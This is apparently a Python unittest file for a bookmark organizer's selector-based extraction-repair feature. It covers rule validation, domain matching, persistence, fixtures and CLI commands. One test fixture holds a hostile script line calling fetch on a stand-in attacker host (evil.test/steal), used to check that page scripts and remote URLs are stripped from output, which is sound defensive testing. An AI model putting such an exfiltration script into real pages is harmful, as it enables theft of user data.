"""Declarative extraction repairs: bounded, selector-only, fail closed."""

from __future__ import annotations

import importlib
import json
import os
import shutil
import sys
import tempfile
import unittest
from io import StringIO
from pathlib import Path

from bookmark_organizer_pro.services.extraction_repairs import (
    MAX_REMOVE_SELECTORS,
    ExtractionRepair,
    load_extraction_repairs,
    preview_repair,
    repair_extraction,
    save_extraction_repairs,
)

# A thread page where a generic extractor keeps the sidebar and only the
# first post, which is exactly the shape a repair exists to correct.
FORUM = """<!doctype html>
<html><head><title>Import stalls at 90 percent</title></head><body>
<nav class="site-nav">Home Forums Search Members</nav>
<aside class="sidebar">Hot threads: buy gold, click here, sponsored offer</aside>
<div id="thread">
  <div class="post"><p>My import stalls near the end every single time and I cannot tell why.</p></div>
  <div class="post"><p>It is the favicon fetch, not the import itself. Disable icon fetching.</p></div>
  <div class="post"><p>That fixed it completely, thank you very much for the help.</p></div>
</div>
<footer class="site-footer">We use cookies. Accept all cookies to continue browsing.</footer>
</body></html>
"""

REPAIR = {
    "name": "Forum threads",
    "domains": ["forum.test"],
    "content_selector": "#thread",
    "remove_selectors": [".sidebar", ".site-footer"],
}


class TestExtractionRepairValidation(unittest.TestCase):
    def test_a_valid_repair_loads(self):
        rule = ExtractionRepair.from_dict(REPAIR)
        self.assertIsNotNone(rule)
        self.assertEqual(rule.domains, ("forum.test",))
        self.assertEqual(rule.content_selector, "#thread")

    def test_unsafe_and_incomplete_rules_fail_closed(self):
        cases = {
            "no domains": {"content_selector": "#thread"},
            "no selectors at all": {"domains": ["forum.test"]},
            "blocked pseudo selector": {"domains": ["forum.test"], "content_selector": "div:has(script)"},
            "blocked contains": {"domains": ["forum.test"], "content_selector": "p:contains(buy)"},
            "oversize selector": {"domains": ["forum.test"], "content_selector": "a" * 500},
            "bad remove selector": {
                "domains": ["forum.test"], "content_selector": "#thread",
                "remove_selectors": ["div:has(x)"],
            },
            "remove selectors not a list": {
                "domains": ["forum.test"], "content_selector": "#thread", "remove_selectors": "x",
            },
            "not an object": ["nope"],
            "bad domain": {"domains": ["not a domain/"], "content_selector": "#thread"},
        }
        for label, payload in cases.items():
            with self.subTest(case=label):
                self.assertIsNone(ExtractionRepair.from_dict(payload))

    def test_remove_selector_count_is_bounded(self):
        rule = ExtractionRepair.from_dict({
            "domains": ["forum.test"],
            "content_selector": "#thread",
            "remove_selectors": [f".junk{i}" for i in range(MAX_REMOVE_SELECTORS + 10)],
        })
        self.assertEqual(len(rule.remove_selectors), MAX_REMOVE_SELECTORS)

    def test_domain_matching_covers_subdomains_only(self):
        rule = ExtractionRepair.from_dict(REPAIR)
        self.assertTrue(rule.matches("https://forum.test/thread/1"))
        self.assertTrue(rule.matches("https://www.forum.test/thread/1"))
        self.assertTrue(rule.matches("https://old.forum.test/thread/1"))
        self.assertFalse(rule.matches("https://notforum.test/thread/1"))
        self.assertFalse(rule.matches("https://example.com/"))


class TestExtractionRepairBehaviour(unittest.TestCase):
    def _rule(self, **overrides):
        payload = dict(REPAIR)
        payload.update(overrides)
        return ExtractionRepair.from_dict(payload)

    def test_repair_keeps_the_thread_and_drops_boilerplate(self):
        result = repair_extraction(
            "https://forum.test/thread/1", FORUM, "default text", repairs=[self._rule()]
        )

        self.assertTrue(result.applied)
        self.assertTrue(result.changed)
        self.assertIn("favicon fetch", result.text)
        self.assertIn("thank you very much", result.text)
        self.assertNotIn("sponsored offer", result.text)
        self.assertNotIn("Accept all cookies", result.text)

    def test_a_non_matching_domain_leaves_the_default_alone(self):
        result = repair_extraction(
            "https://other.test/thread/1", FORUM, "default text", repairs=[self._rule()]
        )
        self.assertFalse(result.applied)
        self.assertEqual(result.text, "default text")

    def test_a_selector_that_matches_nothing_leaves_the_default_alone(self):
        result = repair_extraction(
            "https://forum.test/thread/1", FORUM, "default text",
            repairs=[self._rule(content_selector="#missing")],
        )
        self.assertFalse(result.applied)
        self.assertEqual(result.text, "default text")
        self.assertEqual(result.reason, "content selector matched nothing")

    def test_a_repair_that_produces_almost_nothing_is_refused(self):
        result = repair_extraction(
            "https://forum.test/thread/1", FORUM, "default text",
            repairs=[self._rule(content_selector="nav")],
        )
        self.assertFalse(result.applied)
        self.assertEqual(result.text, "default text")
        self.assertIn("too short", result.reason)

    def test_oversize_pages_are_not_repaired(self):
        huge = FORUM + ("<p>filler</p>" * 400_000)
        result = repair_extraction(
            "https://forum.test/thread/1", huge, "default text", repairs=[self._rule()]
        )
        self.assertFalse(result.applied)
        self.assertIn("too large", result.reason)

    def test_repairs_never_execute_page_script_or_reach_a_new_origin(self):
        hostile = (
            "<html><body><div id='thread'>"
            "<script>fetch('https://evil.test/steal')</script>"
            "<img src='https://evil.test/pixel.png'>"
            "<p>The actual thread body that should survive the repair intact.</p>"
            "</div></body></html>"
        )
        result = repair_extraction(
            "https://forum.test/thread/1", hostile, "", repairs=[self._rule(remove_selectors=[])]
        )

        self.assertTrue(result.applied)
        self.assertIn("actual thread body", result.text)
        # Script text and remote URLs are never carried into extracted output.
        self.assertNotIn("evil.test", result.text)
        self.assertNotIn("fetch(", result.text)

    def test_preview_compares_default_and_repaired_without_saving(self):
        with tempfile.TemporaryDirectory() as tmp:
            store = Path(tmp) / "repairs.json"
            result = preview_repair(
                "https://forum.test/thread/1", FORUM, self._rule(), "default text"
            )

            self.assertTrue(result.applied)
            self.assertEqual(result.default_text, "default text")
            self.assertNotEqual(result.text, result.default_text)
            self.assertTrue(result.to_dict()["changed"])
            self.assertFalse(store.exists(), "preview must not persist anything")


class TestExtractionRepairPersistence(unittest.TestCase):
    def test_round_trip_through_disk(self):
        with tempfile.TemporaryDirectory() as tmp:
            store = Path(tmp) / "repairs.json"
            rule = ExtractionRepair.from_dict(REPAIR)
            save_extraction_repairs([rule], store)

            loaded = load_extraction_repairs(store)
            self.assertEqual(len(loaded), 1)
            self.assertEqual(loaded[0].content_selector, "#thread")
            self.assertEqual(loaded[0].remove_selectors, (".sidebar", ".site-footer"))

    def test_a_malformed_store_yields_no_repairs_instead_of_raising(self):
        with tempfile.TemporaryDirectory() as tmp:
            store = Path(tmp) / "repairs.json"
            store.write_text("{not json", encoding="utf-8")
            self.assertEqual(load_extraction_repairs(store), [])

    def test_unsafe_entries_are_dropped_on_load(self):
        with tempfile.TemporaryDirectory() as tmp:
            store = Path(tmp) / "repairs.json"
            store.write_text(json.dumps({"repairs": [
                REPAIR,
                {"domains": ["bad.test"], "content_selector": "div:has(script)"},
            ]}), encoding="utf-8")

            loaded = load_extraction_repairs(store)
            self.assertEqual([r.domains for r in loaded], [("forum.test",)])

    def test_missing_store_is_not_an_error(self):
        self.assertEqual(load_extraction_repairs(Path("nope-does-not-exist.json")), [])


class TestExtractionRepairFixtures(unittest.TestCase):
    """Representative pages, locked so a repair cannot silently drift."""

    def test_repaired_output_is_stable_for_representative_pages(self):
        rule = ExtractionRepair.from_dict(REPAIR)
        first = repair_extraction("https://forum.test/t/1", FORUM, "", repairs=[rule])
        second = repair_extraction("https://forum.test/t/1", FORUM, "", repairs=[rule])

        self.assertEqual(first.text, second.text)
        self.assertEqual(
            first.text.splitlines(),
            [
                "My import stalls near the end every single time and I cannot tell why.",
                "It is the favicon fetch, not the import itself. Disable icon fetching.",
                "That fixed it completely, thank you very much for the help.",
            ],
        )

    def test_remove_only_repair_strips_boilerplate_from_the_whole_page(self):
        rule = ExtractionRepair.from_dict({
            "domains": ["forum.test"],
            "remove_selectors": [".sidebar", ".site-footer", ".site-nav"],
        })
        result = repair_extraction("https://forum.test/t/1", FORUM, "", repairs=[rule])

        self.assertTrue(result.applied)
        self.assertIn("favicon fetch", result.text)
        self.assertNotIn("sponsored offer", result.text)
        self.assertNotIn("Home Forums Search", result.text)


class TestExtractionRepairCLI(unittest.TestCase):
    """A repair has to be authorable without hand-editing JSON."""

    def setUp(self):
        self._tmp = tempfile.mkdtemp(prefix="bop_repairs_cli_")
        self.addCleanup(shutil.rmtree, self._tmp, ignore_errors=True)
        self._previous = os.environ.get("BOOKMARK_DATA_DIR")
        os.environ["BOOKMARK_DATA_DIR"] = self._tmp
        self.addCleanup(self._restore_data_dir)

        import bookmark_organizer_pro.constants as constants
        import bookmark_organizer_pro.services.extraction_repairs as repairs_module

        importlib.reload(constants)
        constants.ensure_directories()
        importlib.reload(repairs_module)
        self.repairs_module = repairs_module
        self.addCleanup(self._reload_modules)

    def _restore_data_dir(self):
        if self._previous is None:
            os.environ.pop("BOOKMARK_DATA_DIR", None)
        else:
            os.environ["BOOKMARK_DATA_DIR"] = self._previous

    def _reload_modules(self):
        import bookmark_organizer_pro.constants as constants
        import bookmark_organizer_pro.services.extraction_repairs as repairs_module

        importlib.reload(constants)
        importlib.reload(repairs_module)

    def _run(self, args):
        from bookmark_organizer_pro.cli import BookmarkCLI

        captured = StringIO()
        stdout, stderr = sys.stdout, sys.stderr
        sys.stdout = sys.stderr = captured
        try:
            code = BookmarkCLI().run(args)
        except SystemExit as exit_signal:
            code = exit_signal.code
        finally:
            sys.stdout, sys.stderr = stdout, stderr
        return code, captured.getvalue()

    def test_a_repair_can_be_added_listed_and_removed(self):
        code, out = self._run([
            "repairs", "add", "--domain", "forum.test",
            "--keep", "#thread", "--drop", ".sidebar", "--name", "Forum thread",
        ])
        self.assertEqual(code, 0, out)

        stored = self.repairs_module.load_extraction_repairs()
        self.assertEqual([r.name for r in stored], ["Forum thread"])
        self.assertEqual(stored[0].domains, ("forum.test",))
        self.assertEqual(stored[0].content_selector, "#thread")
        self.assertEqual(stored[0].remove_selectors, (".sidebar",))

        _code, listed = self._run(["repairs", "list"])
        self.assertIn("Forum thread", listed)

        code, out = self._run(["repairs", "remove", "--name", "Forum thread"])
        self.assertEqual(code, 0, out)
        self.assertEqual(self.repairs_module.load_extraction_repairs(), [])

    def test_an_unusable_repair_is_refused_and_nothing_is_written(self):
        code, out = self._run(["repairs", "add", "--domain", "not a domain", "--keep", "#thread"])
        self.assertEqual(code, 1)
        self.assertIn("rejected", out)
        self.assertEqual(self.repairs_module.load_extraction_repairs(), [])

    def test_a_duplicate_name_is_refused(self):
        self._run([
            "repairs", "add", "--domain", "forum.test", "--keep", "#thread", "--name", "Dupe",
        ])
        code, out = self._run([
            "repairs", "add", "--domain", "other.test", "--keep", "#main", "--name", "Dupe",
        ])
        self.assertEqual(code, 1)
        self.assertIn("already exists", out)
        self.assertEqual(len(self.repairs_module.load_extraction_repairs()), 1)

    def test_preview_judges_an_unsaved_candidate_without_storing_it(self):
        page = Path(self._tmp) / "thread.html"
        page.write_text(FORUM, encoding="utf-8")

        code, out = self._run([
            "repairs", "preview", "--url", "https://forum.test/t/1", "--html", str(page),
            "--keep", "#thread", "--drop", ".sidebar",
        ])

        self.assertEqual(code, 0, out)
        self.assertIn("applied", out)
        self.assertIn("favicon fetch", out)
        self.assertEqual(
            self.repairs_module.load_extraction_repairs(), [],
            "preview must not save the candidate",
        )


if __name__ == "__main__":
    unittest.main()
